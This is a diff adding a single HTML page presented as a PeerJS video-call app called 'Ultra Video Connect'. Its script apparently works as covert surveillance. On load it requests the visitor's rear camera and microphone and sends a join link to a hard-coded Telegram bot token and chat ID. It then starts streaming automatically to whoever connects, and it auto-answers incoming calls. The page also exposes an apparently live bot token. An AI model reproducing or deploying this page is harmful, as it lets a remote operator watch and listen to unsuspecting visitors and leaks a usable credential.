@@ -1,0 +1,1116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Ultra Video Connect</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+            color: white;
+            overflow: hidden;
+            touch-action: manipulation;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.8);
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            max-height: -webkit-fill-available;
+            transition: all 0.3s ease;
+        }
+        
+        body.fullscreen .container {
+            border-radius: 0;
+            height: 100vh;
+            max-height: 100%;
+        }
+        
+        header {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 12px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #ff6b6b;
+            flex-wrap: wrap;
+            position: relative;
+            z-index: 20;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .logo i {
+            color: #4dabf7;
+            font-size: 20px;
+        }
+        
+        h1 {
+            font-size: 1.2rem;
+            color: #4dabf7;
+            text-shadow: 0 0 8px rgba(77, 171, 247, 0.7);
+        }
+        
+        .status {
+            background: rgba(30, 30, 46, 0.8);
+            padding: 6px 12px;
+            border-radius: 15px;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            min-width: 120px;
+            justify-content: center;
+            margin-top: 5px;
+        }
+        
+        .status.connecting::before {
+            content: "";
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ffc107;
+            display: inline-block;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .status.connected::before {
+            content: "";
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #51cf66;
+            display: inline-block;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
+        
+        .main-content {
+            display: flex;
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .video-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            grid-template-rows: repeat(2, 1fr);
+            flex: 1;
+            gap: 5px;
+            padding: 5px;
+            background: #000;
+        }
+        
+        .video-item {
+            position: relative;
+            background: #000;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        
+        .video-item.self {
+            border: 2px solid #4dabf7;
+        }
+        
+        .video-item .waiting {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.7);
+            text-align: center;
+            padding: 15px;
+            z-index: 5;
+        }
+        
+        .waiting h2 {
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+            color: #4dabf7;
+        }
+        
+        .waiting p {
+            font-size: 0.85rem;
+            line-height: 1.4;
+            margin-bottom: 10px;
+            color: #ddd;
+        }
+        
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #4dabf7;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            background: #000;
+            transform: scaleX(-1);
+        }
+        
+        .video-label {
+            position: absolute;
+            bottom: 5px;
+            left: 5px;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            z-index: 10;
+        }
+        
+        .controls {
+            background: rgba(0, 0, 0, 0.75);
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            border-top: 1px solid #333;
+            z-index: 15;
+        }
+        
+        .control-btn {
+            width: 55px;
+            height: 55px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.3rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+        }
+        
+        .control-btn:active {
+            transform: scale(0.95);
+            background: rgba(255, 255, 255, 0.3);
+        }
+        
+        .call-btn {
+            background: #51cf66;
+        }
+        
+        .end-btn {
+            background: #ff6b6b;
+        }
+        
+        .fullscreen-btn {
+            background: rgba(255, 255, 255, 0.15);
+        }
+        
+        .connect-panel {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(30, 30, 46, 0.95);
+            padding: 25px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.7);
+            z-index: 30;
+            text-align: center;
+        }
+        
+        .connect-panel h3 {
+            margin-bottom: 20px;
+            color: #4dabf7;
+            font-size: 1.4rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .input-group input {
+            padding: 14px;
+            border-radius: 10px;
+            border: none;
+            background: rgba(0, 0, 0, 0.3);
+            color: white;
+            font-size: 1.1rem;
+            text-align: center;
+            border: 2px solid #4dabf7;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #ff6b6b;
+        }
+        
+        .connect-btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: linear-gradient(to right, #4dabf7, #3b5bdb);
+            color: white;
+            margin-top: 10px;
+        }
+        
+        .connect-btn:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .notification {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            background: rgba(30, 30, 46, 0.95);
+            padding: 12px 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            z-index: 100;
+            transform: translateX(120%);
+            transition: transform 0.5s ease;
+            max-width: 90%;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification i {
+            color: #4dabf7;
+            font-size: 1.3rem;
+        }
+        
+        .telegram-status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        
+        .telegram-status.success {
+            background: rgba(40, 167, 69, 0.3);
+            border: 1px solid #28a745;
+        }
+        
+        .telegram-status.error {
+            background: rgba(220, 53, 69, 0.3);
+            border: 1px solid #dc3545;
+        }
+        
+        .camera-selector {
+            position: absolute;
+            bottom: 70px;
+            right: 15px;
+            background: rgba(30, 30, 46, 0.95);
+            border-radius: 10px;
+            padding: 10px;
+            z-index: 25;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+            display: none;
+            flex-direction: column;
+            gap: 8px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .camera-selector.show {
+            display: flex;
+        }
+        
+        .camera-option {
+            padding: 8px 12px;
+            border-radius: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .camera-option:hover {
+            background: rgba(77, 171, 247, 0.3);
+        }
+        
+        .camera-option.active {
+            background: #4dabf7;
+            color: white;
+        }
+        
+        /* Landscape mode adjustments */
+        @media (orientation: landscape) {
+            .container {
+                height: 100vh;
+                max-height: 100%;
+            }
+            
+            .video-container {
+                grid-template-columns: repeat(4, 1fr);
+                grid-template-rows: 1fr;
+            }
+            
+            .controls {
+                padding: 8px 12px;
+            }
+            
+            .control-btn {
+                width: 50px;
+                height: 50px;
+                font-size: 1.2rem;
+            }
+        }
+        
+        /* Portrait mode adjustments */
+        @media (orientation: portrait) and (max-height: 700px) {
+            .connect-panel {
+                padding: 20px;
+            }
+            
+            .waiting h2 {
+                font-size: 1.1rem;
+            }
+            
+            .waiting p {
+                font-size: 0.8rem;
+            }
+            
+            .control-btn {
+                width: 50px;
+                height: 50px;
+                font-size: 1.2rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .logo i {
+                font-size: 18px;
+            }
+            
+            h1 {
+                font-size: 1rem;
+            }
+            
+            .status {
+                font-size: 0.8rem;
+                padding: 5px 10px;
+            }
+            
+            .connect-panel {
+                padding: 20px;
+            }
+            
+            .waiting h2 {
+                font-size: 1rem;
+            }
+            
+            .waiting p {
+                font-size: 0.8rem;
+                margin-bottom: 8px;
+            }
+            
+            .spinner {
+                width: 25px;
+                height: 25px;
+            }
+            
+            .control-btn {
+                width: 45px;
+                height: 45px;
+                font-size: 1.1rem;
+            }
+            
+            .connect-panel h3 {
+                font-size: 1.2rem;
+            }
+            
+            .input-group input {
+                padding: 12px;
+                font-size: 1rem;
+            }
+        }
+        
+        /* Very small screens */
+        @media (max-width: 350px) {
+            .logo {
+                gap: 5px;
+            }
+            
+            h1 {
+                font-size: 0.9rem;
+            }
+            
+            .status {
+                font-size: 0.75rem;
+                padding: 4px 8px;
+            }
+            
+            .waiting h2 {
+                font-size: 0.95rem;
+            }
+            
+            .waiting p {
+                font-size: 0.75rem;
+            }
+            
+            .control-btn {
+                width: 40px;
+                height: 40px;
+                font-size: 1rem;
+            }
+            
+            .connect-panel {
+                padding: 15px;
+            }
+            
+            .connect-panel h3 {
+                font-size: 1.1rem;
+            }
+        }
+        
+        .user-count {
+            background: rgba(30, 30, 46, 0.8);
+            padding: 6px 12px;
+            border-radius: 15px;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-video"></i>
+                <h1>Ultra Video Connect</h1>
+            </div>
+            <div class="status connecting" id="status">Connecting...</div>
+            <div class="user-count" id="userCount">
+                <i class="fas fa-users"></i> <span>1 user</span>
+            </div>
+        </header>
+        
+        <div class="main-content">
+            <div class="video-container" id="videoContainer">
+                <!-- Local video will be added here -->
+                <!-- Remote videos will be added dynamically -->
+            </div>
+            
+            <div class="camera-selector" id="cameraSelector">
+                <!-- Camera options will be added here -->
+            </div>
+            
+            <div class="connect-panel" id="connectPanel">
+                <h3><i class="fas fa-plug"></i> Enter Connection Code</h3>
+                <div class="input-group">
+                    <input type="text" id="peerInput" placeholder="Paste code here" maxlength="6">
+                </div>
+                <button class="connect-btn" id="connectBtn">Connect</button>
+                <div class="telegram-status" id="telegramStatus">
+                    Sending to Telegram bot...
+                </div>
+            </div>
+        </div>
+        
+        <div class="controls">
+            <button class="control-btn" id="micBtn">
+                <i class="fas fa-microphone"></i>
+            </button>
+            <button class="control-btn" id="cameraSwitchBtn">
+                <i class="fas fa-sync-alt"></i>
+            </button>
+            <button class="control-btn call-btn" id="callBtn" disabled>
+                <i class="fas fa-video"></i>
+            </button>
+            <button class="control-btn end-btn" id="endBtn" disabled>
+                <i class="fas fa-phone-slash"></i>
+            </button>
+            <button class="control-btn fullscreen-btn" id="fullscreenBtn">
+                <i class="fas fa-expand"></i>
+            </button>
+        </div>
+    </div>
+    
+    <div class="notification" id="notification">
+        <i class="fas fa-check-circle"></i>
+        <div>
+            <strong>Connected!</strong>
+            <div>You are now connected to the other user</div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram configuration - replace with your actual credentials
+        const BOT_TOKEN = "7743009303:AAEfCdb2kU3xjZHbU-mo_qUbP3wA4aejDRo";
+        const CHAT_ID = "878604830";
+        
+        // DOM Elements
+        const statusEl = document.getElementById('status');
+        const telegramStatusEl = document.getElementById('telegramStatus');
+        const videoContainer = document.getElementById('videoContainer');
+        const peerInput = document.getElementById('peerInput');
+        const connectBtn = document.getElementById('connectBtn');
+        const connectPanel = document.getElementById('connectPanel');
+        const callBtn = document.getElementById('callBtn');
+        const endBtn = document.getElementById('endBtn');
+        const micBtn = document.getElementById('micBtn');
+        const cameraSwitchBtn = document.getElementById('cameraSwitchBtn');
+        const fullscreenBtn = document.getElementById('fullscreenBtn');
+        const notification = document.getElementById('notification');
+        const cameraSelector = document.getElementById('cameraSelector');
+        const userCountEl = document.getElementById('userCount');
+        
+        // State variables
+        let peer;
+        let currentPeerId;
+        let localStream;
+        let remoteStreams = {};
+        let activeConnections = {};
+        let activeCalls = {};
+        let isInitiator = true;
+        let isMuted = false;
+        let isCameraOff = false;
+        let currentCamera = 'environment';
+        let videoDevices = [];
+        let userCount = 1;
+        
+        // Initialize the application
+        async function init() {
+            // Get query parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const codeParam = urlParams.get('code');
+            
+            if (codeParam) {
+                // We are the second user (joining)
+                isInitiator = false;
+                connectPanel.style.display = 'block';
+                statusEl.textContent = 'Joining call...';
+                telegramStatusEl.style.display = 'none';
+            } else {
+                // We are the first user (initiator)
+                isInitiator = true;
+                connectPanel.style.display = 'none';
+                statusEl.textContent = 'Waiting for connection...';
+            }
+            
+            // Generate peer ID
+            const peerId = isInitiator ? generatePeerId() : 'guest_' + generatePeerId().substring(0, 4);
+            currentPeerId = peerId;
+            
+            if (isInitiator) {
+                // Send to Telegram bot
+                sendToTelegramBot(peerId);
+            }
+            
+            // Initialize PeerJS
+            peer = new Peer(peerId, {
+                host: '0.peerjs.com',
+                port: 443,
+                path: '/',
+                secure: true
+            });
+            
+            // Peer event handlers
+            peer.on('open', (id) => {
+                console.log('Peer connected with ID:', id);
+                if (isInitiator) {
+                    statusEl.textContent = 'Waiting for connection...';
+                } else {
+                    statusEl.textContent = 'Ready to connect...';
+                }
+            });
+            
+            peer.on('connection', (conn) => {
+                console.log('Incoming connection from:', conn.peer);
+                activeConnections[conn.peer] = conn;
+                setupConnection(conn);
+                updateUserCount();
+            });
+            
+            peer.on('call', (call) => {
+                console.log('Incoming call from:', call.peer);
+                call.answer(localStream);
+                
+                call.on('stream', (stream) => {
+                    console.log('Received remote stream from:', call.peer);
+                    addRemoteVideo(stream, call.peer);
+                    remoteStreams[call.peer] = stream;
+                    
+                    // Vibrate and show notification
+                    vibrateDevice();
+                    showNotification();
+                    statusEl.textContent = 'Connected!';
+                    statusEl.className = 'status connected';
+                    
+                    callBtn.disabled = true;
+                    endBtn.disabled = false;
+                });
+                
+                call.on('close', () => {
+                    console.log('Call ended with:', call.peer);
+                    removeRemoteVideo(call.peer);
+                    delete remoteStreams[call.peer];
+                    updateUserCount();
+                });
+            });
+            
+            peer.on('error', (err) => {
+                console.error('PeerJS error:', err);
+                statusEl.textContent = `Error: ${err.type}`;
+            });
+            
+            // Get user media with HD quality
+            try {
+                const constraints = {
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        frameRate: { ideal: 30 },
+                        facingMode: currentCamera
+                    },
+                    audio: true
+                };
+                
+                localStream = await navigator.mediaDevices.getUserMedia(constraints);
+                addLocalVideo();
+                
+                if (!isInitiator) {
+                    callBtn.disabled = false;
+                }
+                
+                // Get available cameras
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                videoDevices = devices.filter(device => device.kind === 'videoinput');
+                populateCameraSelector();
+            } catch (err) {
+                console.error('Error accessing media devices:', err);
+                statusEl.textContent = 'Error accessing camera/microphone';
+            }
+        }
+        
+        // Add local video to the grid
+        function addLocalVideo() {
+            const videoItem = document.createElement('div');
+            videoItem.className = 'video-item self';
+            videoItem.id = 'localVideoItem';
+            
+            const video = document.createElement('video');
+            video.id = 'localVideo';
+            video.autoplay = true;
+            video.muted = true;
+            video.playsInline = true;
+            video.srcObject = localStream;
+            
+            const label = document.createElement('div');
+            label.className = 'video-label';
+            label.textContent = 'You';
+            
+            videoItem.appendChild(video);
+            videoItem.appendChild(label);
+            videoContainer.prepend(videoItem);
+        }
+        
+        // Add remote video to the grid
+        function addRemoteVideo(stream, peerId) {
+            if (document.getElementById(`remoteVideoItem-${peerId}`)) return;
+            
+            const videoItem = document.createElement('div');
+            videoItem.className = 'video-item';
+            videoItem.id = `remoteVideoItem-${peerId}`;
+            
+            const waiting = document.createElement('div');
+            waiting.className = 'waiting';
+            waiting.innerHTML = `
+                <h2>Connecting to ${peerId.substring(0, 6)}</h2>
+                <p>Establishing video connection...</p>
+                <div class="spinner"></div>
+            `;
+            
+            const video = document.createElement('video');
+            video.id = `remoteVideo-${peerId}`;
+            video.autoplay = true;
+            video.playsInline = true;
+            video.srcObject = stream;
+            
+            const label = document.createElement('div');
+            label.className = 'video-label';
+            label.textContent = `User ${peerId.substring(0, 4)}`;
+            
+            videoItem.appendChild(video);
+            videoItem.appendChild(waiting);
+            videoItem.appendChild(label);
+            videoContainer.appendChild(videoItem);
+            
+            // Hide waiting after a short delay
+            setTimeout(() => {
+                waiting.style.display = 'none';
+            }, 2000);
+            
+            userCount++;
+            updateUserCount();
+        }
+        
+        // Remove remote video from the grid
+        function removeRemoteVideo(peerId) {
+            const videoItem = document.getElementById(`remoteVideoItem-${peerId}`);
+            if (videoItem) {
+                videoItem.remove();
+                userCount--;
+                updateUserCount();
+            }
+        }
+        
+        // Update user count display
+        function updateUserCount() {
+            const totalUsers = Object.keys(remoteStreams).length + 1;
+            userCountEl.innerHTML = `<i class="fas fa-users"></i> <span>${totalUsers} users</span>`;
+        }
+        
+        // Generate a random peer ID
+        function generatePeerId() {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+            let result = '';
+            for (let i = 0; i < 6; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+        
+        // Send to Telegram bot
+        async function sendToTelegramBot(code) {
+            const message = `🚀 New Video Call Connection Request!\n\n💻 Connection Code: ${code}\n🔗 Direct Link: ${window.location.href}?code=${code}\n\nClick the link to join instantly!`;
+            
+            telegramStatusEl.textContent = 'Sending to Telegram bot...';
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    telegramStatusEl.textContent = '✅ Sent to Telegram bot successfully!';
+                    telegramStatusEl.className = 'telegram-status success';
+                } else {
+                    telegramStatusEl.textContent = '❌ Failed to send to Telegram bot. Please share manually.';
+                    telegramStatusEl.className = 'telegram-status error';
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                telegramStatusEl.textContent = '❌ Network error. Please share manually.';
+                telegramStatusEl.className = 'telegram-status error';
+            }
+        }
+        
+        // Set up connection events
+        function setupConnection(conn) {
+            conn.on('open', () => {
+                console.log('Connection established with:', conn.peer);
+                statusEl.textContent = 'Connected!';
+                statusEl.className = 'status connected';
+                
+                if (isInitiator) {
+                    // Initiator starts the call automatically
+                    startCall(conn.peer);
+                }
+            });
+            
+            conn.on('data', (data) => {
+                console.log('Received data:', data);
+                if (data.type === 'callRequest') {
+                    startCall(conn.peer);
+                }
+            });
+            
+            conn.on('close', () => {
+                console.log('Connection closed with:', conn.peer);
+                statusEl.textContent = 'Connection closed';
+                statusEl.className = 'status connecting';
+                callBtn.disabled = true;
+                endBtn.disabled = true;
+                
+                removeRemoteVideo(conn.peer);
+                delete activeConnections[conn.peer];
+                delete remoteStreams[conn.peer];
+                updateUserCount();
+            });
+            
+            conn.on('error', (err) => {
+                console.error('Connection error:', err);
+                statusEl.textContent = 'Connection error';
+            });
+        }
+        
+        // Start a video call
+        function startCall(peerId) {
+            console.log('Starting call with:', peerId);
+            
+            // Call the remote peer
+            const call = peer.call(peerId, localStream);
+            activeCalls[peerId] = call;
+            
+            call.on('stream', (stream) => {
+                console.log('Received remote stream from:', peerId);
+                addRemoteVideo(stream, peerId);
+                remoteStreams[peerId] = stream;
+                
+                // Vibrate and show notification
+                vibrateDevice();
+                showNotification();
+                statusEl.className = 'status connected';
+                
+                callBtn.disabled = true;
+                endBtn.disabled = false;
+            });
+            
+            call.on('close', () => {
+                console.log('Call ended with:', peerId);
+                removeRemoteVideo(peerId);
+                delete remoteStreams[peerId];
+                delete activeCalls[peerId];
+                updateUserCount();
+            });
+        }
+        
+        // Populate camera selector
+        function populateCameraSelector() {
+            cameraSelector.innerHTML = '';
+            
+            videoDevices.forEach((device, index) => {
+                const option = document.createElement('div');
+                option.className = 'camera-option';
+                if (index === 0) option.classList.add('active');
+                option.textContent = device.label || `Camera ${index + 1}`;
+                option.dataset.deviceId = device.deviceId;
+                
+                option.addEventListener('click', () => {
+                    document.querySelectorAll('.camera-option').forEach(opt => {
+                        opt.classList.remove('active');
+                    });
+                    option.classList.add('active');
+                    switchCamera(device.deviceId);
+                });
+                
+                cameraSelector.appendChild(option);
+            });
+        }
+        
+        // Switch camera
+        async function switchCamera(deviceId) {
+            try {
+                // Stop current tracks
+                localStream.getTracks().forEach(track => track.stop());
+                
+                // Get new stream with selected camera
+                const constraints = {
+                    video: {
+                        deviceId: { exact: deviceId },
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        frameRate: { ideal: 30 }
+                    },
+                    audio: true
+                };
+                
+                localStream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                // Update local video
+                const localVideo = document.getElementById('localVideo');
+                if (localVideo) {
+                    localVideo.srcObject = localStream;
+                }
+                
+                // Update all active calls with the new stream
+                Object.values(activeCalls).forEach(call => {
+                    call.peerConnection.getSenders().forEach(sender => {
+                        if (sender.track.kind === 'video') {
+                            const newTrack = localStream.getVideoTracks()[0];
+                            sender.replaceTrack(newTrack);
+                        }
+                    });
+                });
+                
+                // Hide camera selector
+                cameraSelector.classList.remove('show');
+            } catch (err) {
+                console.error('Error switching camera:', err);
+            }
+        }
+        
+        // Toggle fullscreen
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(err => {
+                    console.error(`Error attempting to enable fullscreen: ${err.message}`);
+                });
+                document.body.classList.add('fullscreen');
+            } else {
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                    document.body.classList.remove('fullscreen');
+                }
+            }
+        }
+        
+        // Vibrate device
+        function vibrateDevice() {
+            if (navigator.vibrate) {
+                // Vibrate pattern: 200ms vibrate, 100ms pause, 200ms vibrate
+                navigator.vibrate([200, 100, 200]);
+            }
+        }
+        
+        // Show notification
+        function showNotification() {
+            notification.classList.add('show');
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Event Listeners
+        connectBtn.addEventListener('click', () => {
+            const remotePeerId = peerInput.value.trim();
+            if (!remotePeerId) {
+                alert('Please enter a connection code');
+                return;
+            }
+            
+            if (remotePeerId === currentPeerId) {
+                alert('You cannot connect to yourself!');
+                return;
+            }
+            
+            console.log('Connecting to:', remotePeerId);
+            statusEl.textContent = `Connecting to ${remotePeerId}...`;
+            
+            // Establish connection
+            activeConnections[remotePeerId] = peer.connect(remotePeerId);
+            setupConnection(activeConnections[remotePeerId]);
+            
+            // Hide the panel after connecting
+            connectPanel.style.display = 'none';
+        });
+        
+        callBtn.addEventListener('click', () => {
+            Object.keys(activeConnections).forEach(peerId => {
+                activeConnections[peerId].send({ type: 'callRequest' });
+                startCall(peerId);
+            });
+        });
+        
+        endBtn.addEventListener('click', () => {
+            Object.keys(activeConnections).forEach(peerId => {
+                if (activeConnections[peerId]) {
+                    activeConnections[peerId].close();
+                }
+            });
+            
+            Object.keys(remoteStreams).forEach(peerId => {
+                removeRemoteVideo(peerId);
+            });
+            
+            remoteStreams = {};
+            activeConnections = {};
+            activeCalls = {};
+            
+            statusEl.textContent = 'Call ended';
+            statusEl.className = 'status connecting';
+            callBtn.disabled = false;
+            endBtn.disabled = true;
+            userCount = 1;
+            updateUserCount();
+        });
+        
+        micBtn.addEventListener('click', () => {
+            if (localStream) {
+                isMuted = !isMuted;
+                localStream.getAudioTracks().forEach(track => {
+                    track.enabled = !isMuted;
+                });
+                micBtn.innerHTML = isMuted ? '<i class="fas fa-microphone-slash"></i>' : '<i class="fas fa-microphone"></i>';
+                micBtn.style.background = isMuted ? '#ff6b6b' : 'rgba(255, 255, 255, 0.1)';
+            }
+        });
+        
+        cameraSwitchBtn.addEventListener('click', () => {
+            cameraSelector.classList.toggle('show');
+        });
+        
+        fullscreenBtn.addEventListener('click', toggleFullscreen);
+        
+        // Initialize the app
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
